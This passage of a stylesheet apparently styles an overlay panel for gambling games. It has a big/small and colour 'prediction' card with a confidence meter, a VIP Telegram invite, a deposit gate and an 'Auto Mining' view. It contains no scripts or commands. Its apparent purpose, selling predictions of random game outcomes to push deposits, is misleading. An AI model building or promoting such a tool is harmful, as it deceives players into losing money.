0 0 1px rgba(255,255,255,.05), 0 0 80px rgba(32,211,116,.06); --hdr-bg: #25272A; --hdr-border: rgba(55,73,99,.55); --t-title: #FFFFFF; --t-name: #FFFFFF; --t-body: #93939D; --t-dim: rgba(147,147,157,.6); --card-bg: #25272A; --card-bdr: rgba(255,255,255,.06); --back-bg: #25272A; --back-bdr: rgba(255,255,255,.08); --back-col: #93939D; --back-col-h: #FFFFFF; --back-bdr-h: rgba(32,211,116,.5); --pro: #20D374; --pro-lt: rgba(32,211,116,.13); --pro-glow: rgba(32,211,116,.2); --pro-txt: #8ff0bd; --pro-bdr-h: rgba(32,211,116,.45); --vip: #FEAA57; --vip-lt: rgba(254,170,87,.13); --vip-glow: rgba(254,170,87,.2); --vip-txt: #ffd2a6; --vip-bdr-h: rgba(254,170,87,.45); --mine: #21D9CC; --mine-lt: rgba(33,217,204,.13); --mine-glow: rgba(33,217,204,.2); --mine-txt: #a3f1ec; --mine-bdr-h: rgba(33,217,204,.45); --upi: #6EA8F4; --upi-lt: rgba(110,168,244,.13); --upi-glow: rgba(110,168,244,.2); --upi-txt: #c5dcfb; --upi-bdr-h: rgba(110,168,244,.45); --pc-bg: linear-gradient(150deg, #25272A 0%, #1b1c21 100%); --pc-bdr: rgba(32,211,116,.16); --pc-shad: 0 10px 36px rgba(0,0,0,.45), 0 0 0 1px rgba(32,211,116,.08); --tw-bg: #111217; --tw-bdr: rgba(255,255,255,.06); --strip: rgba(255,255,255,.06); --live: #20D374; --gate-title: #FFFFFF; --gate-bal-bg: rgba(32,211,116,.12); --gate-bal-col: #8ff0bd; --gate-bal-bdr: rgba(32,211,116,.24); --stat-bg: #25272A; --stat-bdr: rgba(255,255,255,.06); --chev: rgba(255,255,255,.18); --chip-bg: #25272A; --chip-bdr: rgba(255,255,255,.08); --chip-col: #D7D7D7; --chip-hash: #93939D;}.logo { width: 50px; height: 50px; border-radius: 50%; overflow: hidden; cursor: grab; display: block; transition: box-shadow .22s, transform .22s; box-shadow: 0 4px 20px rgba(0,0,0,.45), 0 0 0 2.5px rgba(255,255,255,.15), 0 0 0 5px rgba(139,92,246,.08);}.logo:hover { box-shadow: 0 6px 26px rgba(0,0,0,.55), 0 0 0 2.5px rgba(255,255,255,.25), 0 0 0 6px rgba(139,92,246,.14); transform: scale(1.06) }.logo.dragging { cursor: grabbing; transform: scale(.93); box-shadow: 0 8px 30px rgba(0,0,0,.6) }.logo img { width: 100%; height: 100%; object-fit: cover; display: block; pointer-events: none }:host(.light) .logo { box-shadow: 0 4px 18px rgba(200,50,50,.3), 0 0 0 2.5px rgba(249,89,89,.28), 0 0 0 5px rgba(249,89,89,.1) }:host(.light) .logo:hover { box-shadow: 0 6px 24px rgba(200,50,50,.4), 0 0 0 2.5px rgba(249,89,89,.4), 0 0 0 6px rgba(249,89,89,.14) }:host([data-route="other"]) .logo, :host([data-route="other"]) .panel { display: none !important }.panel { display: none; width: min(86vw, 288px); border-radius: 20px; overflow: hidden; background: var(--panel-bg); border: 1px solid var(--panel-border); box-shadow: var(--panel-shadow); backdrop-filter: blur(36px); -webkit-backdrop-filter: blur(36px); font-family: var(--f);}.panel.active { display: block; animation: panelIn .22s var(--ease) }@keyframes panelIn { from { opacity:0; transform:scale(.91) translateY(8px) } to { opacity:1; transform:scale(1) translateY(0) } }.panel-header { display: flex; align-items: center; justify-content: space-between; padding: 11px 13px; cursor: grab; background: var(--hdr-bg); border-bottom: 1px solid var(--hdr-border);}.panel-header.dragging { cursor: grabbing }.panel-title { display: flex; align-items: center; gap: 6px; font-size: 13px; font-weight: 700; color: var(--t-title); letter-spacing: -.1px }:host(.light) .panel-title { color: #fff }.panel-title img { width: 20px; height: 20px; border-radius: 50%; box-shadow: 0 1px 6px rgba(0,0,0,.25); cursor: pointer; touch-action: manipulation; position: relative; z-index: 1 }.brand-pw { font-size: 14px; font-weight: 800; letter-spacing: .2px; color: #fff; position: relative; display: inline-flex; align-items: baseline }.pw-in { position: relative; display: inline-block }.pw-i { position: relative; display: inline-block }.pw-star { position: absolute; top: 2px; left: 50%; transform: translateX(-50%); width: 8px; height: 8px; color: #facc15; filter: drop-shadow(0 1px 1px rgba(0,0,0,.2)) }.pw-smile { position: absolute; bottom: -2px; left: 50%; transform: translateX(-45%); width: 16px; height: 6px; stroke: #fff; filter: drop-shadow(0 1px 1px rgba(0,0,0,.15)) }.ai-badge { padding: 1px 5px; border-radius: 4px; font-size: 8.5px; font-weight: 700; letter-spacing: .8px; background: transparent; border: 1px solid rgba(255,255,255,.35); color: rgba(255,255,255,.8); line-height: 1.5 }:host(.light) .ai-badge { border-color: rgba(255,255,255,.5); color: rgba(255,255,255,.9) }.pw-tld { font-weight: 500; opacity: .55; font-size: 11px }.close-btn { width: 24px; height: 24px; border-radius: 7px; border: none; background: var(--x-bg); color: var(--x-col); font-size: 11px; cursor: pointer; line-height: 1; display: flex; align-items: center; justify-content: center; font-family: var(--f); transition: all .15s;}.close-btn:hover { background: var(--x-bg-h); color: var(--x-col-h) }.panel-body { padding: 14px 12px 13px; color: var(--t-body); font-size: 12px; line-height: 1.5; animation: fadeUp .24s var(--ease) .04s both }@keyframes fadeUp { from { opacity:0; transform:translateY(8px) } to { opacity:1; transform:translateY(0) } }.view { display: none }.view.active { display: block; animation: viewIn .2s var(--ease) }@keyframes viewIn { from { opacity:0; transform:translateX(8px) } to { opacity:1; transform:translateX(0) } }.view.active { display: block; animation: viewIn .2s var(--ease) }.view-menu.active { animation: vipFadeIn .16s cubic-bezier(.16, 1, .3, 1) both; }@keyframes viewIn { from { opacity:0; transform:translateX(8px) } to { opacity:1; transform:translateX(0) } }/* ── Main Menu ── */.menu-shell { display: flex; flex-direction: column; }.menu-home-card { background: var(--card-bg); border: 1px solid var(--card-bdr); border-radius: 14px; overflow: hidden; position: relative;}.menu-home-card::before { content: \'\'; position: absolute; top: -1px; left: 14px; right: 14px; height: 1px; background: linear-gradient(90deg, transparent, color-mix(in srgb, var(--pro) 28%, transparent), transparent); pointer-events: none;}.menu-home-opt { display: flex; align-items: center; gap: 10px; width: 100%; padding: 11px 12px; border: none; background: transparent; cursor: pointer; text-align: left; font-family: var(--f); transition: background .16s var(--ease), transform .16s var(--ease);}.menu-home-opt + .menu-home-opt { border-top: 1px solid var(--strip); }.menu-home-opt:hover { background: var(--strip); }.menu-home-opt:active { transform: scale(.99); transition-duration: .06s; }.menu-home-icon { width: 36px; height: 36px; border-radius: 10px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; transition: transform .18s var(--ease);}.menu-home-icon svg { width: 18px; height: 18px; fill: currentColor; }.menu-home-pro .menu-home-icon { background: var(--pro-lt); color: var(--pro); }.menu-home-vip .menu-home-icon { background: var(--vip-lt); color: var(--vip); }.menu-home-mine .menu-home-icon { background: var(--mine-lt); color: var(--mine); }.menu-home-opt:hover .menu-home-icon { transform: scale(1.05); }.menu-home-body { flex: 1; min-width: 0; }.menu-home-top { display: flex; align-items: center; gap: 6px; margin-bottom: 1px; }.menu-home-name { font-size: 13px; font-weight: 700; letter-spacing: -.15px; color: var(--t-title);}.menu-home-desc { display: block; font-size: 10px; font-weight: 500; color: var(--t-body); letter-spacing: .02px;}.menu-home-arrow { width: 12px; height: 12px; flex-shrink: 0; stroke: var(--t-dim); stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; fill: none; opacity: 0; transform: translateX(-4px); transition: opacity .16s var(--ease), transform .16s var(--ease), stroke .16s var(--ease);}.menu-home-pro:hover .menu-home-arrow { opacity: .75; transform: translateX(0); stroke: var(--pro); }.menu-home-vip:hover .menu-home-arrow { opacity: .75; transform: translateX(0); stroke: var(--vip); }.menu-home-mine:hover .menu-home-arrow { opacity: .75; transform: translateX(0); stroke: var(--mine); }.menu-home-foot { display: flex; align-items: center; justify-content: center; gap: 6px; padding-top: 9px; margin-top: 8px; border-top: 1px solid var(--strip); font-size: 9.5px; color: var(--t-dim); font-weight: 500;}.menu-home-live { display: flex; align-items: center; gap: 4px; }.menu-home-live .status-dot { width: 4px; height: 4px; }.menu-home-foot-sep { opacity: .2; font-size: 9px; font-weight: 300; }.menu-home-tg { display: inline-flex; align-items: center; gap: 3px; border: none; background: transparent; padding: 0; font-family: var(--f); font-size: 9.5px; font-weight: 500; color: #2AABEE; cursor: pointer; transition: opacity .15s, transform .15s;}.menu-home-tg:hover { opacity: .85; }.menu-home-tg:active { transform: scale(.98); }.menu-home-tg svg { flex-shrink: 0; width: 10px; height: 10px; }.card-badge { font-size: 8px; font-weight: 800; text-transform: uppercase; letter-spacing: .5px; padding: 2px 7px; border-radius: 50px; border: 1px solid transparent }.badge-pro { background: var(--pro-lt); color: var(--pro-txt); border-color: var(--pro-bdr-h); }.badge-vip { background: var(--vip-lt); color: var(--vip-txt); border-color: var(--vip-bdr-h); }.badge-mine { background: var(--mine-lt); color: var(--mine-txt); border-color: var(--mine-bdr-h); }.badge-upi { background: var(--upi-lt); color: var(--upi-txt); border-color: var(--upi-bdr-h); }.badge-crypto { background: var(--crypto-lt); color: var(--crypto-txt); border-color: var(--crypto-bdr-h); }.status-row { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 9px 0 0; margin-top: 9px; border-top: 1px solid var(--strip); font-size: 10px; color: var(--t-dim); font-weight: 500; letter-spacing: .2px }.status-live { display: flex; align-items: center; gap: 5px }.status-dot { width: 5px; height: 5px; border-radius: 50%; background: var(--live); flex-shrink: 0; animation: livePulse 2.4s ease-in-out infinite }.status-sep { color: var(--t-dim); opacity: 0.35 }.status-tg-btn { display: inline-flex; align-items: center; gap: 4px; border: none; background: transparent; padding: 2px 6px; font-family: var(--f); font-size: 10px; font-weight: 600; color: #2AABEE; cursor: pointer; transition: opacity .15s, transform .15s; border-radius: 6px }.status-tg-btn:hover { opacity: .85 }.status-tg-btn:active { transform: scale(.96) }.status-tg-btn svg { flex-shrink: 0 }@keyframes livePulse { 0%,100% { opacity:1; box-shadow:0 0 0 0 rgba(52,211,153,.5) } 50% { opacity:.6; box-shadow:0 0 0 4px rgba(52,211,153,0) } }.back-btn { width: 32px; height: 32px; border-radius: 10px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; border: 1px solid var(--back-bdr); background: var(--back-bg); color: var(--back-col); cursor: pointer; padding: 0; font-family: var(--f); transition: all .18s;}.back-btn svg { width: 14px; height: 14px; stroke: currentColor; fill: none; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round }.back-btn:hover { color: var(--back-col-h); border-color: var(--back-bdr-h); background: var(--pro-lt) }.pro-top { display: flex; align-items: center; gap: 10px; margin-bottom: 10px }.pro-gameinfo { flex: 1; min-width: 0; display: flex; flex-direction: column; gap: 2px }.pro-gameinfo-row { display: flex; align-items: center; gap: 7px }.pro-game-name { font-size: 13.5px; font-weight: 800; color: var(--t-title); letter-spacing: -.25px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis }:host(.light) .pro-game-name { color: #1f1f2e }.pro-live-badge { display: inline-flex; align-items: center; gap: 4px; background: rgba(52,211,153,.1); border: 1px solid rgba(52,211,153,.22); border-radius: 50px; padding: 2px 8px; font-size: 8px; font-weight: 800; text-transform: uppercase; letter-spacing: .8px; color: #34d399; flex-shrink: 0; white-space: nowrap }:host(.light) .pro-live-badge { background: rgba(22,163,74,.07); border-color: rgba(22,163,74,.2); color: #16a34a }.pro-round { font-size: 10px; font-weight: 600; color: var(--t-dim); letter-spacing: .4px; font-variant-numeric: tabular-nums; font-family: var(--f) }:host(.light) .pro-round { color: #9ca3af }.live-pip { width: 5px; height: 5px; border-radius: 50%; flex-shrink: 0; background: currentColor; animation: livePulse 2s ease-in-out infinite }.pro-timer-wrap { position: relative; text-align: center; margin: 0 0 10px; padding: 9px 12px 11px; background: var(--tw-bg); border: 1px solid var(--tw-bdr); border-radius: 16px; overflow: hidden }.pro-timer-wrap::after { content: \'\'; position: absolute; bottom: 0; left: 0; height: 3px; border-radius: 0 3px 3px 0; width: var(--pct,100%); background: linear-gradient(90deg, var(--live), #a7f3d0); transition: width 1s linear, background .6s }.pro-timer-wrap.tw-warn::after { background: linear-gradient(90deg, #f59e0b, #fde68a) }.pro-timer-wrap.tw-end::after { background: linear-gradient(90deg, #ef4444, #fca5a5) }.pro-timer-label { font-size: 9px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; color: var(--t-dim); margin-bottom: 2px }.pro-timer { font-size: 30px; font-weight: 900; letter-spacing: 2px; font-variant-numeric: tabular-nums; line-height: 1; color: var(--t-title); font-family: var(--f); transition: color .4s }.pro-timer.t-warn { color: #f59e0b }.pro-timer.t-end { color: #ef4444; animation: timerShake .45s var(--ease) infinite }@keyframes timerShake { 0%,100%{transform:scale(1)} 50%{transform:scale(1.07)} }.pro-card { background: var(--pc-bg); border: 1px solid var(--pc-bdr); border-radius: 16px; padding: 20px 14px 16px; box-shadow: var(--pc-shad); min-height: 138px; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; transition: border-color .5s, box-shadow .5s;}.pro-card::before { content: \'\'; position: absolute; inset: 0; background: linear-gradient(105deg, transparent 35%, rgba(139,92,246,.05) 50%, transparent 65%); opacity: 0; transition: opacity .3s }.pro-card.shimmer::before { opacity: 1; animation: sweep 1.7s ease-in-out infinite }@keyframes sweep { 0%{transform:translateX(-100%)} 100%{transform:translateX(100%)} }.pro-card.c-big { border-color: rgba(254,170,87,.24); box-shadow: 0 10px 36px rgba(254,170,87,.12), 0 0 0 1px rgba(254,170,87,.1) }.pro-card.c-small { border-color: rgba(110,168,244,.24); box-shadow: 0 10px 36px rgba(110,168,244,.12), 0 0 0 1px rgba(110,168,244,.1) }:host(.light) .pro-card.c-big { border-color: rgba(254,170,87,.3); box-shadow: 0 6px 24px rgba(254,170,87,.15), 0 0 0 1px rgba(254,170,87,.12) }:host(.light) .pro-card.c-small { border-color: rgba(110,168,244,.3); box-shadow: 0 6px 24px rgba(110,168,244,.15), 0 0 0 1px rgba(110,168,244,.12) }.pro-scanning { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 14px; min-height: 100px; width: 100% }.scan-rings { position: relative; width: 52px; height: 52px }.scan-ring-o { position: absolute; inset: 0; border-radius: 50%; border: 2px solid transparent; border-top-color: var(--pro); animation: spin 1.3s linear infinite }.scan-ring-i { position: absolute; inset: 11px; border-radius: 50%; border: 2px solid transparent; border-top-color: var(--pro-txt); opacity: .5; animation: spin .75s linear infinite reverse }@keyframes spin { to { transform:rotate(360deg) } }.scan-label { font-size: 11px; font-weight: 600; color: var(--t-body); letter-spacing: .2px; font-family: var(--f); display: flex; align-items: center; gap: 3px }.s-dot { width:3px; height:3px; border-radius:50%; background:currentColor; opacity:.3; animation:blink 1.2s ease-in-out infinite }.s-dot:nth-child(2){animation-delay:.2s} .s-dot:nth-child(3){animation-delay:.4s}@keyframes blink { 0%,80%,100%{opacity:.2} 40%{opacity:.9} }.pro-prediction { width: 100%; text-align: center; animation: reveal .45s cubic-bezier(.2,.8,.2,1) }@keyframes reveal { from { opacity:0; transform:scale(.84); filter:blur(6px) } to { opacity:1; transform:scale(1); filter:blur(0) } }.streak-badge { display: none; align-items: center; justify-content: center; gap: 4px; padding: 3px 10px; border-radius: 50px; margin: 0 auto 10px; background: var(--pro-lt); color: var(--pro-txt); border: 1px solid rgba(139,92,246,.2); font-size: 9px; font-weight: 800; letter-spacing: .3px; text-transform: uppercase; width: fit-content }:host(.light) .streak-badge { background: rgba(224,60,60,.07); color: #b91c1c; border-color: rgba(224,60,60,.16) }.pred-hero { position: relative; display: flex; align-items: center; justify-content: center; margin-bottom: 12px; height: 68px }.pred-glow { position: absolute; width: 82px; height: 82px; border-radius: 50%; filter: blur(24px); opacity: 0; transition: opacity .5s, background .5s; pointer-events: none }.pred-glow.big { background: var(--big); opacity: .22 }.pred-glow.small { background: var(--small); opacity: .22 }:host(.light) .pred-glow.big { opacity: .16 }:host(.light) .pred-glow.small { opacity: .16 }.pred-ball { width: 60px; height: 60px; background-size: contain; background-repeat: no-repeat; background-position: center; filter: drop-shadow(0 6px 14px rgba(0,0,0,.25)); position: relative; z-index: 1; animation: float 3s ease-in-out infinite }@keyframes float { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-4px)} }.pred-tags { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 12px }.pred-size { padding: 7px 26px; border-radius: 50px; font-size: 15px; font-weight: 900; color: #fff; letter-spacing: -.1px; position: relative; overflow: hidden; transition: all .35s }.pred-size::after { content: \'\'; position: absolute; top: -60%; left: -40%; width: 180%; height: 160%; background: linear-gradient(135deg, rgba(255,255,255,.18), transparent 55%); pointer-events: none }.pred-size.big { background: linear-gradient(135deg,#FEAA57,#f97316); box-shadow:0 4px 18px rgba(254,170,87,.45) }.pred-size.small { background: linear-gradient(135deg,#6EA8F4,#3b82f6); box-shadow:0 4px 18px rgba(110,168,244,.45) }.pred-color { padding: 5px 14px; border-radius: 50px; font-size: 10px; font-weight: 800; color: #fff; letter-spacing: .4px; text-transform: uppercase }.pred-color.red { background: linear-gradient(135deg,#fb5b5b,#dc2626) }.pred-color.green { background: linear-gradient(135deg,#18b660,#16a34a) }.pred-color.violet { background: linear-gradient(135deg,#c86eff,#9333ea) }.pred-conf { display: flex; align-items: center; gap: 8px }.conf-track { flex: 1; height: 5px; background: var(--strip); border-radius: 3px; overflow: hidden }.conf-fill { height: 100%; border-radius: 3px; background: linear-gradient(90deg, var(--big), #fb5b5b); transition: width .7s var(--ease); width: 0; position: relative }.conf-fill.small { background: linear-gradient(90deg, var(--small), #6EA8F4) }.conf-fill::after { content: \'\'; position: absolute; right: -1px; top: -2px; bottom: -2px; width: 7px; background: inherit; border-radius: 50%; filter: blur(3px); opacity: .65 }.conf-pct { font-size: 12px; font-weight: 900; color: var(--t-title); font-variant-numeric: tabular-nums; min-width: 35px; text-align: right }:host(.light) .conf-pct { color: #1f1f2e }.pred-history { display: none; align-items: center; justify-content: center; gap: 4px; margin-top: 10px; padding-top: 10px; border-top: 1px solid var(--strip) }.hist-label { font-size: 9px; font-weight: 700; color: var(--t-dim); letter-spacing: .2px; margin-right: 2px }.hist-dot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; transition: transform .2s; cursor: default }.hist-dot.big { background: var(--big); box-shadow:0 0 5px rgba(254,170,87,.4) }.hist-dot.small { background: var(--small); box-shadow:0 0 5px rgba(110,168,244,.4) }.hist-dot:hover { transform: scale(1.4) }.vip-header { display: flex; align-items: center; gap: 9px; margin-bottom: 12px }.vip-header-label { flex: 1; font-size: 13.5px; font-weight: 800; color: var(--t-title); letter-spacing: -.2px }.vip-invite-pill { display: inline-flex; align-items: center; gap: 4px; background: var(--vip-lt); border: 1px solid var(--vip-bdr-h); border-radius: 50px; padding: 2px 8px; font-size: 8px; font-weight: 800; text-transform: uppercase; letter-spacing: .8px; color: var(--vip); white-space: nowrap }.vip-hero-card { background: var(--card-bg); border: 1px solid var(--card-bdr); border-radius: 18px; padding: 22px 16px 20px; text-align: center; margin-bottom: 10px; position: relative; overflow: hidden }.vip-hero-card::before { content: \'\'; position: absolute; top: -50px; left: 50%; transform: translateX(-50%); width: 140px; height: 140px; background: radial-gradient(circle, rgba(42,171,238,.13) 0%, transparent 70%); pointer-events: none }.vip-tg-ring { width: 60px; height: 60px; border-radius: 50%; background: linear-gradient(135deg, #2AABEE, #229ED9); display: flex; align-items: center; justify-content: center; margin: 0 auto 13px; box-shadow: 0 0 0 8px rgba(42,171,238,.1), 0 0 0 16px rgba(42,171,238,.05), 0 6px 24px rgba(42,171,238,.38); animation: tgPulse 2.8s ease-in-out infinite }@keyframes tgPulse { 0%,100% { box-shadow: 0 0 0 8px rgba(42,171,238,.1), 0 0 0 16px rgba(42,171,238,.05), 0 6px 24px rgba(42,171,238,.38) } 50% { box-shadow: 0 0 0 11px rgba(42,171,238,.14), 0 0 0 20px rgba(42,171,238,.06), 0 8px 30px rgba(42,171,238,.44) } }.vip-title { font-size: 17px; font-weight: 900; color: var(--gate-title); margin: 0 0 7px; letter-spacing: -.5px; font-family: var(--f); line-height: 1.2 }.vip-pitch { font-size: 11.5px; line-height: 1.6; color: var(--t-body); margin: 0; font-family: var(--f) }.vip-stats { display: grid; grid-template-columns: 1fr 1fr 1fr; margin: 0 0 10px; text-align: center; background: var(--stat-bg); border-radius: 14px; border: 1px solid var(--stat-bdr); padding: 10px 0 }.vip-stat { display: flex; flex-direction: column; gap: 1px }.vip-stat + .vip-stat { border-left: 1px solid var(--stat-bdr) }.stat-val { font-size: 17px; font-weight: 900; color: var(--gate-title); letter-spacing: -.5px; font-family: var(--f) }.stat-lbl { font-size: 9px; font-weight: 700; color: var(--t-dim); text-transform: uppercase; letter-spacing: .7px }.vip-cta { width: 100%; padding: 12px 16px; border-radius: 13px; border: none; background: linear-gradient(135deg, #2AABEE, #1a90cc); color: #fff; font-size: 13.5px; font-weight: 800; letter-spacing: .02px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 7px; font-family: var(--f); box-shadow: 0 5px 20px rgba(42,171,238,.38), 0 0 0 1px rgba(42,171,238,.2); transition: all .2s var(--ease); position: relative; overflow: hidden }.vip-cta::after { content: \'\'; position: absolute; inset: 0; background: linear-gradient(135deg, rgba(255,255,255,.15), transparent 55%); pointer-events: none }.vip-cta:hover { box-shadow: 0 8px 28px rgba(42,171,238,.52), 0 0 0 1px rgba(42,171,238,.3); transform: translateY(-2px) }.vip-cta:active { transform: scale(.97); transition-duration: .08s }.vip-arrow { flex-shrink: 0; transition: transform .2s var(--ease) }.vip-cta:hover .vip-arrow { transform: translateX(3px) }.vip-note { text-align: center; font-size: 9.5px; color: var(--t-dim); margin: 8px 0 0; font-family: var(--f); font-weight: 500; letter-spacing: .1px }.gate-view { display: none; padding: 22px 16px 24px; text-align: center; animation: fadeUp .25s var(--ease) }.gate-icon { width: 46px; height: 46px; margin: 0 auto 12px; background: var(--pro-lt); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--pro); box-shadow: 0 0 0 6px var(--pro-glow) }.gate-title { font-size: 16px; font-weight: 900; color: var(--gate-title); margin: 0 0 6px; letter-spacing: -.4px; font-family: var(--f) }.gate-bal-wrap { margin-bottom: 10px }.gate-balance { display: inline-flex; align-items: center; background: var(--gate-bal-bg); padding: 5px 14px; border-radius: 50px; font-size: 13px; font-weight: 800; color: var(--gate-bal-col); border: 1px solid var(--gate-bal-bdr); font-family: var(--f) }.gate-desc { font-size: 11px; line-height: 1.55; color: var(--t-body); margin: 0 0 16px; font-family: var(--f) }.gate-actions { display: flex; flex-direction: column; gap: 7px }.gate-btn { padding: 11px 14px; border-radius: 12px; border: none; font-size: 13px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; font-family: var(--f); transition: all .2s var(--ease); position: relative; overflow: hidden }.gate-btn:active { transform: scale(.97) }.gate-btn::after { content: \'\'; position: absolute; inset: 0; background: linear-gradient(135deg, rgba(255,255,255,.12), transparent 55%); pointer-events: none }.btn-deposit { background: linear-gradient(135deg, #22c55e, #16a34a); color: #fff; box-shadow: 0 4px 16px rgba(34,197,94,.32) }.btn-deposit:hover { box-shadow: 0 6px 22px rgba(34,197,94,.44); transform: translateY(-1px) }.btn-telegram { background: var(--card-bg); color: var(--t-body); border: 1px solid var(--card-bdr); font-weight: 600; font-size: 12px }.btn-telegram:hover { color: var(--t-title); border-color: var(--pro-bdr-h) }.pro-prediction .pred-hero, .pro-prediction .pred-color { display: none }.pro-prediction.vip-mode .pred-hero { display: flex }.pro-prediction.vip-mode .pred-color { display: inline-block }.mine-header { display: flex; align-items: center; gap: 9px; margin-bottom: 12px }.mine-header-label { flex: 1; font-size: 13.5px; font-weight: 800; color: var(--t-title); letter-spacing: -.2px }.mine-energy-pill { display: inline-flex; align-items: center; gap: 4px; background: var(--mine-lt); border: 1px solid var(--mine-bdr-h); border-radius: 50px; padding: 2.5px 9px 2.5px 7px; font-size: 9px; font-weight: 700; letter-spacing: .5px; color: var(--mine); white-space: nowrap; animation: energyPulse 2.5s ease-in-out infinite }:host(.light) .mine-energy-pill { color: var(--mine-txt) }@keyframes energyPulse { 0%,100% { box-shadow: 0 0 0 0 transparent } 50% { box-shadow: 0 0 0 4px var(--mine-glow) } }.energy-svg { width: 11px; height: 11px; fill: currentColor; }/* ── Auto Mining ── */.view-mining { position: relative; }.view-mining.active { animation: vipFadeIn .16s cubic-bezier(.16, 1, .3, 1) both; }.mine-shell { display: flex; flex-direction: column; }.mine-card { background: var(--card-bg); border: 1px solid var(--card-bdr); border-radius: 14px; overflow: hidden; position: relative;}.mine-card::before { content: \'\'; position: absolute; top: -1px; left: 14px; right: 14px; height: 1px; background: linear-gradient(90deg, transparent, color-mix(in srgb, var(--mine) 32%, transparent), transparent); pointer-events: none;}.mine-row { display: flex; align-items: center; justify-content: space-between; gap: 8px; padding: 9px 13px; min-height: 36px; border-bottom: 1px solid var(--strip);}.mine-lbl { font-size: 11.5px; font-weight: 600; color: var(--t-body); letter-spacing: -.05px; display: inline-flex; align-items: center; gap: 6px; flex-shrink: 0;}.mine-lbl-icon { width: 14px; height: 14px; flex-shrink: 0; opacity: .6; }.mine-val { font-size: 13px; font-weight: 800; color: var(--mine); font-family: var(--f); font-variant-numeric: tabular-nums; letter-spacing: -.2px;}.mine-input-wrap { display: flex; align-items: center; gap: 3px; background: var(--back-bg); border: 1px solid var(--card-bdr); border-radius: 8px; padding: 4px 8px; transition: border-color .15s, box-shadow .15s;}.mine-input-wrap:focus-within { border-color: var(--mine-bdr-h); box-shadow: 0 0 0 3px var(--mine-glow);}.mine-symbol { font-size: 10px; font-weight: 600; color: var(--t-dim); }.mine-input { width: 68px; background: transparent; border: none; outline: none; padding: 0; font-size: 12px; font-weight: 700; color: var(--t-title); font-family: var(--f); text-align: right; -webkit-appearance: none; appearance: none; font-variant-numeric: tabular-nums;}.mine-input::-webkit-inner-spin-button, .mine-input::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0 }.mine-terminal-section { padding: 9px 11px; border-bottom: 1px solid var(--strip);}.mining-terminal { background: var(--back-bg); border: 1px solid var(--card-bdr); border-radius: 9px; padding: 8px 10px; height: 72px; overflow-y: auto; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 9px; color: var(--t-dim); display: flex; flex-direction: column; gap: 2px; scrollbar-width: none; scroll-behavior: smooth;}.mining-terminal::-webkit-scrollbar { display: none }.mining-terminal .console-line.win { color: var(--mine); }.mining-terminal .console-line.loss { color: var(--pro); }.mining-terminal .console-line.wait { color: var(--t-dim); }.mining-terminal .console-line.active { color: var(--mine); font-weight: 600; }.mine-card-foot { padding: 10px 13px 11px; }.mine-cta { width: 100%; padding: 11px; border-radius: 11px; border: none; background: var(--mine); color: #fff; font-size: 12.5px; font-weight: 700; letter-spacing: -.1px; cursor: pointer; font-family: var(--f); box-shadow: 0 2px 12px color-mix(in srgb, var(--mine) 30%, transparent); transition: transform .15s cubic-bezier(.16, 1, .3, 1), box-shadow .15s cubic-bezier(.16, 1, .3, 1), background .15s; position: relative; overflow: hidden;}.mine-cta::after { content: \'\'; position: absolute; inset: 0; background: linear-gradient(135deg, rgba(255, 255, 255, .1), transparent 52%); pointer-events: none;}.mine-cta:hover { box-shadow: 0 4px 16px color-mix(in srgb, var(--mine) 40%, transparent); }.mine-cta:active { transform: scale(.98); transition-duration: .06s; }.mine-cta.active { background: var(--pro); box-shadow: 0 2px 12px color-mix(in srgb, var(--pro) 30%, transparent);}.mine-cta.active:hover { box-shadow: 0 4px 16px color-mix(in srgb, var(--pro) 40%, transparent); }.mine-note { text-align: center; font-size: 9.5px; color: var(--t-dim); margin: 7px 0 0; font-weight: 500; letter-spacing: .02px;}.mine-hist-btn { width: 32px; height: 32px; border-radius: 10px; flex-shrink: 0; margin-left: auto; display: flex; align-items: center; justify-content: center; border: 1px solid var(--mine-bdr-h); background: var(--mine-lt); color: var(--mine); cursor: pointer; padding: 0; transition: background .15s, color .15s, border-color .15s, transform .15s;}.mine-hist-btn svg { width: 14px; height: 14px; }.mine-hist-btn:hover { background: var(--mine); color: #fff; }.mine-hist-btn:active { transform: scale(.97); transition-duration: .06s; }.mining-energy-modal { position: absolute; inset: 0; z-index: 100; background: rgba(10, 8, 28, 0.88); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); display: flex; align-items: center; justify-content: center; border-radius: 16px; padding: 20px; box-sizing: border-box; animation: modalPop .2s cubic-bezier(.16, 1, .3, 1) forwards;}@keyframes modalPop { 0% { opacity: 0; transform: scale(.97); } 100% { opacity: 1; transform: scale(1); } }.energy-modal-close { position: absolute; top: 10px; right: 10px; width: 28px; height: 28px; border-radius: 50%; background: var(--back-bg); border: 1px solid var(--card-bdr); display: flex; align-items: center; justify-content: center; cursor: pointer; transition: background .15s; padding: 0;}.energy-modal-close svg { width: 14px; height: 14px; color: var(--t-dim); }.energy-modal-close:hover { background: var(--strip); }.energy-modal-content { text-align: center; max-width: 220px; display: flex; flex-direction: column; align-items: center; gap: 8px;}.energy-modal-icon { width: 50px; height: 50px; border-radius: 14px; background: var(--pro-lt); border: 1px solid var(--pro-bdr-h); display: flex; align-items: center; justify-content: center; color: var(--pro);}.energy-modal-icon svg { width: 28px; height: 28px; }.energy-modal-title { font-size: 14px; font-weight: 800; color: var(--t-title); letter-spacing: -.2px; }.energy-modal-desc { font-size: 10.5px; font-weight: 500; color: var(--t-body); line-height: 1.5; }.energy-modal-actions { display: flex; flex-direction: column; gap: 7px; width: 100%; margin-top: 6px; }.energy-btn-primary { width: 100%; padding: 11px; border-radius: 11px; font-size: 12.5px; font-weight: 700; cursor: pointer; font-family: var(--f); border: none; background: var(--mine); color: #fff; box-shadow: 0 2px 12px color-mix(in srgb, var(--mine) 